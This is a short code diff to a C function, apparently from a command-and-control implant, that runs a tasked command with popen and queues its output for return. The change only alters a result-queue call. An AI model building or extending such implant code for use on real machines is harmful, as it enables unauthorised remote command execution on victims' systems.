@@ -48,7 +48,7 @@ int execute_payload(PayloadContext *ctx) {
 
     FILE *f = popen(cmdline, "r");
     if(!f) {
-        rq_add(ctx->rq, t.id, "*", "Implant failed to execute command");
+        rq_add(ctx->rq, t.id, "Implant failed to execute command");
         free(t.cmd);
         // printf("huh this failed, debug\n");
         return -1;
@@ -59,7 +59,7 @@ int execute_payload(PayloadContext *ctx) {
 
     if(!output) output = strdup("NO OUTPUT");
 
-    rq_add(ctx->rq, t.id, "*", output);
+    rq_add(ctx->rq, t.id, output);
     printf("✅ - Executed task %d, output: %s\n", t.id, output);
 
     free(output);
